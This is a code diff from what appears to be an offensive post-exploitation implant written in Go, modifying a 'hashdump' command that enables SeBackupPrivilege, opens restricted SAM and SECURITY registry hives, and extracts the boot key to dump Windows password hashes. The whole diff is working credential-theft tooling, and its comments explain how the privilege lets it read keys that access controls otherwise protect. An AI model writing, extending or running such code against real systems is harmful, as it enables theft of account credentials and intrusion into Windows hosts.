@@ -19,11 +19,9 @@ import (
 
 var (
 	advapi32HD           = windows.NewLazySystemDLL("advapi32.dll")
-	procRegOpenKeyExW    = advapi32HD.NewProc("RegOpenKeyExW")
 	procRegQueryInfoKeyW = advapi32HD.NewProc("RegQueryInfoKeyW")
 	procRegQueryValueExW = advapi32HD.NewProc("RegQueryValueExW")
 	procRegEnumKeyExW    = advapi32HD.NewProc("RegEnumKeyExW")
-	procRegCloseKey      = advapi32HD.NewProc("RegCloseKey")
 )
 
 const (
@@ -63,8 +61,14 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Enable SeBackupPrivilege on both process and thread tokens
 	// Thread token is needed when impersonating SYSTEM via getsystem
-	enableBackupPrivilege()
-	enableThreadBackupPrivilege()
+	if err := enableBackupPrivilege(); err != nil {
+		// Non-fatal: process token privilege may not be adjustable
+		_ = err
+	}
+	if err := enableThreadBackupPrivilege(); err != nil {
+		// Non-fatal: thread token may not exist (no impersonation)
+		_ = err
+	}
 
 	// Step 1: Extract boot key from SYSTEM hive
 	bootKey, err := extractBootKey()
@@ -126,28 +130,25 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	return result
 }
 
-// regOpenKey opens a registry key using RegOpenKeyExW with REG_OPTION_BACKUP_RESTORE.
-// This bypasses DACLs on restricted keys (like SAM) when SeBackupPrivilege is held.
-// Uses RegOpenKeyExW (not RegCreateKeyExW) to avoid write-lock contention on SAM/SECURITY hives.
+// regOpenKey opens a registry key using the Go stdlib windows.RegOpenKeyEx.
+// As SYSTEM or with SeBackupPrivilege, KEY_READ is sufficient to access
+// restricted keys (SAM, SECURITY) without special ulOptions flags.
 func regOpenKey(root uintptr, path string) (uintptr, error) {
-	pathPtr, _ := windows.UTF16PtrFromString(path)
-	var hKey uintptr
-	ret, _, err := procRegOpenKeyExW.Call(
-		root,
-		uintptr(unsafe.Pointer(pathPtr)),
-		uintptr(regOptionBackupRestore),
-		uintptr(windows.KEY_READ),
-		uintptr(unsafe.Pointer(&hKey)),
-	)
-	if ret != 0 {
-		return 0, fmt.Errorf("RegOpenKeyExW(%s): %v (code %d)", path, err, ret)
+	pathPtr, err := windows.UTF16PtrFromString(path)
+	if err != nil {
+		return 0, fmt.Errorf("invalid path %q: %v", path, err)
 	}
-	return hKey, nil
+	var hKey windows.Handle
+	regerr := windows.RegOpenKeyEx(windows.Handle(root), pathPtr, 0, windows.KEY_READ, &hKey)
+	if regerr != nil {
+		return 0, fmt.Errorf("RegOpenKeyEx(%s): %v", path, regerr)
+	}
+	return uintptr(hKey), nil
 }
 
 // regCloseKey closes a registry key handle
 func regCloseKey(hKey uintptr) {
-	procRegCloseKey.Call(hKey)
+	windows.RegCloseKey(windows.Handle(hKey))
 }
 
 // regQueryClassName reads the class name of a registry key
